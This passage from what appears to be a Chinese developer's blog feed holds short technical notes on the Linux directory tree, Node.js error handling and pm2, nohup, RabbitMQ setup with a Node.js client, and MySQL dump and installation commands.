        <content type="html"><![CDATA[<h3 id="Linux目录树"><a href="#Linux目录树" class="headerlink" title="Linux目录树"></a>Linux目录树</h3><p>文件系统层次结构标准（英语：Filesystem Hierarchy Standard，FHS）定义了Linux操作系统中的主要目录及目录内容。在大多数情况下，它是一个传统BSD文件系统层次结构的形式化与扩充。  </p><p><a href="http://naotu.baidu.com/file/e1901e0ff8626dab7aa0a0030c49a443?token=f36657e586143cc9">百度脑图</a></p><p><img src="/images/linux-directory-tree.png"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.ruanyifeng.com/blog/2012/02/a_history_of_unix_directory_structure.html">【1】</a> <a href="http://www.jb51.net/article/15800.htm">【2】</a> <a href="http://linux.vbird.org/linux_basic/0210filepermission.php">【3】</a> <a href="http://www.runoob.com/linux/linux-system-contents.html">【4】</a> <a href="http://yangrong.blog.51cto.com/6945369/1288072">【5】</a> <a href="http://h2appy.blog.51cto.com/609721/781281/">【6】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Node.js最佳实践</title>
      <link href="/post/nodejs-best-practice.html"/>
      <url>/post/nodejs-best-practice.html</url>
      
        <content type="html"><![CDATA[<h3 id="Node-js最佳实践"><a href="#Node-js最佳实践" class="headerlink" title="Node.js最佳实践"></a>Node.js最佳实践</h3><h4 id="使用全局变量"><a href="#使用全局变量" class="headerlink" title="使用全局变量"></a>使用全局变量</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">global</span>.<span class="property">CONSTANTS</span> = constants;</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">E</span> = E;</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">PID</span> = process.<span class="property">pid</span>;</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">WORKSPACE</span> = __dirname;</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">TEMP</span> = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;.temp&#x27;</span>);</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">APP_ID</span> = uuid.<span class="title function_">v4</span>();</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">NOOP</span> = _.<span class="property">noop</span>;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -r global test.js</span><br></pre></td></tr></table></figure><h4 id="全局临时目录-temp-WORKSPACE"><a href="#全局临时目录-temp-WORKSPACE" class="headerlink" title="全局临时目录.temp &amp; WORKSPACE"></a>全局临时目录<code>.temp</code> &amp; <code>WORKSPACE</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mkdirp = <span class="built_in">require</span>(<span class="string">&#x27;mkdirp&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// init</span></span><br><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    mkdirp.<span class="title function_">sync</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;.temp&#x27;</span>));</span><br><span class="line">    mkdirp.<span class="title function_">sync</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;logs&#x27;</span>));</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h4 id="二级缓存"><a href="#二级缓存" class="headerlink" title="二级缓存"></a>二级缓存</h4><p>lru-cache + redis</p><h4 id="co-catch-next-promise-catch-next"><a href="#co-catch-next-promise-catch-next" class="headerlink" title="co-catch-next | promise.catch-next"></a>co-catch-next | promise.catch-next</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">co</span>(<span class="keyword">function</span>* () &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;).<span class="title function_">catch</span>(next);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Q.<span class="title function_">fcall</span>(promisedStep1)</span><br><span class="line">.<span class="title function_">then</span>(promisedStep2)</span><br><span class="line">.<span class="title function_">then</span>(promisedStep3)</span><br><span class="line">.<span class="title function_">then</span>(promisedStep4)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function">(<span class="params">value4</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// Do something with value4</span></span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">catch</span>(next);</span><br></pre></td></tr></table></figure><h4 id="异常处理-catch-next-uncaughtException-domain"><a href="#异常处理-catch-next-uncaughtException-domain" class="headerlink" title="异常处理 catch-next &amp; uncaughtException &amp; domain"></a>异常处理 catch-next &amp; <code>uncaughtException</code> &amp; <code>domain</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">err, req, req, next</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">res.<span class="title function_">send</span>(<span class="string">&#x27;HTTP-Internal Server Error&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">db.<span class="title function_">stop</span>(<span class="keyword">function</span>(<span class="params">err</span>) &#123;</span><br><span class="line">process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> domain = <span class="built_in">require</span>(<span class="string">&#x27;domain&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span> (<span class="params">handler</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> <span class="title function_">domainMiddleware</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> reqDomain = domain.<span class="title function_">create</span>();</span><br><span class="line"></span><br><span class="line">        res.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            reqDomain.<span class="title function_">dispose</span>();</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        reqDomain.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> handler === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">                <span class="title function_">handler</span>(err, req, res, next);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_">next</span>(err);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        reqDomain.<span class="title function_">run</span>(next);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="退出程序"><a href="#退出程序" class="headerlink" title="退出程序"></a>退出程序</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;SIGINT&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">db.<span class="title function_">stop</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        process.<span class="title function_">exit</span>(err ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="pm2-yml配置"><a href="#pm2-yml配置" class="headerlink" title="pm2.yml配置"></a><code>pm2.yml</code>配置</h4><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pm2.yml</span></span><br><span class="line"><span class="attr">apps:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">script   :</span> <span class="string">&#x27;./app.js&#x27;</span></span><br><span class="line">      <span class="attr">name     :</span> <span class="string">&#x27;app&#x27;</span></span><br><span class="line">      <span class="attr">exec_mode:</span> <span class="string">&#x27;cluster&#x27;</span></span><br><span class="line">      <span class="attr">instances:</span> <span class="string">&#x27;max&#x27;</span></span><br><span class="line">      <span class="attr">watch    :</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">env :</span></span><br><span class="line">          <span class="attr">NODE_ENV:</span> <span class="string">local</span></span><br><span class="line">      <span class="attr">env_vps:</span></span><br><span class="line">          <span class="attr">NODE_ENV:</span> <span class="string">vps</span></span><br><span class="line">      <span class="attr">env_production:</span></span><br><span class="line">          <span class="attr">NODE_ENV:</span> <span class="string">production</span></span><br><span class="line">      <span class="attr">log_date_format:</span> <span class="string">&#x27;YYYY-MM-DD HH:mm:ss Z&#x27;</span></span><br><span class="line">      <span class="attr">combine_logs:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">merge_logs:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">error_file:</span> <span class="string">&#x27;./logs/pm2_app_err.log&#x27;</span></span><br><span class="line">      <span class="attr">out_file:</span> <span class="string">&#x27;./logs/pm2_app_out.log&#x27;</span></span><br><span class="line">      <span class="attr">autorestart:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">force:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pm2 start pm2.yml --env production</span></span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.infoq.com/cn/articles/quit-scheme-of-node-uncaughtexception-emergence">【1】</a> <a href="https://fengmk2.com/blog/2012/12/domain_module.html">【2】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nohup</title>
      <link href="/post/nohup.html"/>
      <url>/post/nohup.html</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>nohup 命令可以将程序以忽略挂起信号的方式运行起来，被运行的程序的输出信息将不会显示到终端。  </p><p>该命令的一般形式为<code>nohup command &amp;</code>。</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup command &gt;/dev/null 2&gt;&amp;1   # doesn&#x27;t create nohup.out</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup command &gt;/dev/null 2&gt;&amp;1 &amp; # runs in background, still doesn&#x27;t create nohup.out</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup command &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp; # completely detached from terminal</span><br></pre></td></tr></table></figure><blockquote><p>解释：<br>前面的 nohup 和后面的 &amp; 我想大家都能明白了把。<br>主要是中间的 2&gt;&amp;1 的意思<br>这个意思是把标准错误（2）重定向到标准输出中（1），而标准输出又导入文件 output 里面，<br>所以结果是标准错误和标准输出都导入文件 output 里面了。<br>至于为什么需要将标准错误重定向到标准输出的原因，那就归结为标准错误没有缓冲区，而stdout有。<br>这就会导致 &gt;output 2&gt;output 文件output被两次打开，而stdout和stderr将会竞争覆盖，这肯定不是我门想要的。<br>这就是为什么有人会写成：<br>nohup .&#x2F;command.sh &gt;output 2&gt;output出错的原因了  </p></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.sina.com.cn/s/blog_6c9eaa1501011zml.html">【1】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RabbitMQ</title>
      <link href="/post/rabbitmq.html"/>
      <url>/post/rabbitmq.html</url>
      
        <content type="html"><![CDATA[<h3 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>由于RabbitMQ是基于Erlang语言开发的，所以要使用RabbitMQ的前提当然是要安装其运行环境。  </p><blockquote><p>不同版本的RabbitMQ对Erlang版本的要求不同，安装时需要注意</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install erlang</span><br></pre></td></tr></table></figure><p>安装RabbitMQ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.rabbitmq.com/releases/rabbitmq-server/v3.3.5/rabbitmq-server-3.3.5-1.noarch.rpm</span><br><span class="line"></span><br><span class="line">yum install rabbitmq-server-3.3.5-1.noarch.rpm</span><br></pre></td></tr></table></figure><p>加入开机启动服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig rabbitmq-server on</span><br></pre></td></tr></table></figure><p>然后启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service rabbitmq-server start</span><br></pre></td></tr></table></figure><p>启用web管理<br>查看web管理是否启用，运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmq-plugins list -e</span><br></pre></td></tr></table></figure><p>如果打印的列表中没有rabbitmq_management，需要开启该插件才可以使用，运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmq-plugins enable rabbitmq_management</span><br></pre></td></tr></table></figure><p>创建用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl delete_user guest # 删除guest用户</span><br><span class="line"></span><br><span class="line">rabbitmqctl add_user admin 123456 # 添加一个用户</span><br><span class="line"></span><br><span class="line">rabbitmqctl set_user_tags admin administrator # 授予角色</span><br><span class="line"></span><br><span class="line">rabbitmqctl set_permissions -p / admin &#x27;.*&#x27; &#x27;.*&#x27; &#x27;.*&#x27; # 授权</span><br></pre></td></tr></table></figure><p>开放防火墙端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp -m multitport --dports 5672,15672 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tpc -m multitport --sports 5672,15672 -j ACCEPT</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="管理命令"><a href="#管理命令" class="headerlink" title="管理命令"></a>管理命令</h3><h4 id="rabbitmqadmin-cli"><a href="#rabbitmqadmin-cli" class="headerlink" title="rabbitmqadmin-cli"></a>rabbitmqadmin-cli</h4><p>默认是没有<code>rabbitmqadmin</code>命令的。首先安装rabbitmqadmin-cli <a href="https://www.rabbitmq.com/management-cli.html">点击去下载页</a>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rabbitmq/rabbitmq-management/rabbitmq_v3_6_10/bin/rabbitmqadmin</span><br></pre></td></tr></table></figure><p>然后修改权限<code>chmod +x rabbitmqadmin</code>，移动到<code>/usr/local/bin</code>。</p><p>使用实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 列出来host下面的所有exchanges</span><br><span class="line">rabbitmqadmin --username user --password pass --host host -V / list exchanges</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 新声明一个exchange</span><br><span class="line">rabbitmqadmin declare exchange name=my-new-exchange type=fanout</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 声明一个queue</span><br><span class="line">rabbitmqadmin declare queue name=my-new-queue durable=false</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqadmin declare binding source=my-new-exchange destination=my-new-queue routing_key=routing_key</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqadmin delete binding source=my-new-exchange destination=my-new-queue destination_type=queue properties_key=routing_key</span><br></pre></td></tr></table></figure><h4 id="Node-js使用RabbitMQ"><a href="#Node-js使用RabbitMQ" class="headerlink" title="Node.js使用RabbitMQ"></a>Node.js使用RabbitMQ</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> q = <span class="string">&#x27;tasks&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> open = <span class="built_in">require</span>(<span class="string">&#x27;amqplib&#x27;</span>).<span class="title function_">connect</span>(<span class="string">&#x27;amqp://admin:12345@#localhost&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Publisher</span></span><br><span class="line">open</span><br><span class="line">    .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">conn</span>) &#123;</span><br><span class="line">        process.<span class="title function_">once</span>(<span class="string">&#x27;SIGINT&#x27;</span>, conn.<span class="property">close</span>.<span class="title function_">bind</span>(conn));</span><br><span class="line">        <span class="keyword">return</span> conn.<span class="title function_">createChannel</span>();</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">ch</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ch.<span class="title function_">assertQueue</span>(q).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">ok</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ch.<span class="title function_">sendToQueue</span>(q, <span class="keyword">new</span> <span class="title class_">Buffer</span>(<span class="string">&#x27;something to do&#x27;</span>));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">warn</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Consumer</span></span><br><span class="line">open</span><br><span class="line">    .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">conn</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> conn.<span class="title function_">createChannel</span>();</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">ch</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ch.<span class="title function_">assertQueue</span>(q).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">ok</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ch.<span class="title function_">consume</span>(q, <span class="keyword">function</span> (<span class="params">msg</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (msg !== <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(msg.<span class="property">content</span>.<span class="title function_">toString</span>());</span><br><span class="line">                    ch.<span class="title function_">ack</span>(msg);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">warn</span>);</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.qaulau.com/linux-centos-install-rabbitmq/">【1】</a> <a href="https://my.oschina.net/hncscwc/blog/262246">【2】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>socket常见错误</title>
      <link href="/post/socket-error.html"/>
      <url>/post/socket-error.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://lzy.iteye.com/blog/383884">【1】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL</title>
      <link href="/post/mysql.html"/>
      <url>/post/mysql.html</url>
      
        <content type="html"><![CDATA[<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="chang常用命令"><a href="#chang常用命令" class="headerlink" title="chang常用命令"></a>chang常用命令</h3><ol><li>   数据库复制</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump db_1 -uroot -ppassword -h10.0.1.4 --add-drop-table | mysql db_2 -uroot -ppassword -h10.0.1.4</span><br></pre></td></tr></table></figure><blockquote><p>–add-drop-table 先删除后创建表<br>–skip-add-drop-table 直接创建表<br>–skip-extended-insert 如果记录存在则不插入（每条数据一个insert语句）<br>–no-create-info 不创建表，只导入<br>–lock-tables&#x3D;false 不锁表<br>–set-gtid-purged&#x3D;OFF 全局事物</p></blockquote><p>import </p><blockquote><p>-f skip-errors</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u [user] -p [db_name] | gzip &gt; [filename_to_compress.sql.gz]</span><br><span class="line">gunzip &lt; [compressed_filename.sql.gz]  | mysql -u [user] -p[password] [databasename]</span><br></pre></td></tr></table></figure><ol start="2"><li>修改MySQL用户密码安全等级<br><a href="http://www.cnblogs.com/ivictor/p/5142809.html">参考</a></li></ol><h3 id="安装的MySQL"><a href="#安装的MySQL" class="headerlink" title="安装的MySQL"></a>安装的MySQL</h3><p><a href="https://dev.mysql.com/doc/refman/5.7/en/linux-installation-yum-repo.html">参考</a> <a href="http://www.jianshu.com/p/d7b9c468f20d">MySQL创建用户与授权</a></p><ol><li><p>Adding the MySQL Yum Repository</p><ul><li><p>Go to the Download MySQL Yum Repository page (<a href="http://dev.mysql.com/downloads/repo/yum/">http://dev.mysql.com/downloads/repo/yum/</a>) in the MySQL Developer Zone.</p></li><li><p>Select and download the release package for your platform.<br> CentOS 6</p></li></ul> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://repo.mysql.com/mysql57-community-release-el6-11.noarch.rpm</span><br></pre></td></tr></table></figure><p> CentOS 7<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm</span><br></pre></td></tr></table></figure></p><ul><li>Install the downloaded release package with the following command</li></ul> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum localinstall mysql57-community-release-el6-11.noarch.rpm</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看那些 repository 是启用状态</span><br><span class="line">yum repolist enabled | grep &quot;mysql.*-community.*&quot;</span><br></pre></td></tr></table></figure></li><li><p>Selecting a Release Series</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum repolist all | grep mysql</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 启用 repository</span><br><span class="line">sudo yum-config-manager --disable mysql57-community</span><br><span class="line">sudo yum-config-manager --enable mysql56-community</span><br></pre></td></tr></table></figure></li><li><p>Installing MySQL</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install mysql-community-server</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 只需要安装客户端时 </span><br><span class="line">sudo yum install mysql-community-client</span><br></pre></td></tr></table></figure></li><li><p>Starting the MySQL Server</p><ul><li>Start the MySQL server</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service mysqld start</span><br></pre></td></tr></table></figure><ul><li>Check the status of the MySQL</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service mysqld status</span><br></pre></td></tr></table></figure><ul><li>Find password for the superuser</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grep &#x27;temporary password&#x27; /var/log/mysqld.log</span><br></pre></td></tr></table></figure><ul><li>Login &amp; set a custom password</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;MyNewPass4!&#x27;;</span><br><span class="line"># OR</span><br><span class="line">SET PASSWORD FOR &#x27;bob&#x27;@&#x27;%.loc.gov&#x27; = PASSWORD(&#x27;newpass&#x27;);</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 创建用户并授权</span><br><span class="line">CREATE USER &#x27;username&#x27;@&#x27;host&#x27; IDENTIFIED BY &#x27;password&#x27;;</span><br><span class="line">GRANT privileges ON databasename.tablename TO &#x27;username&#x27;@&#x27;host&#x27;</span><br><span class="line"></span><br><span class="line">e.g.</span><br><span class="line">CREATE USER &#x27;pig&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;pig2017&#x27;;</span><br><span class="line">GRANT ALL ON *.* TO 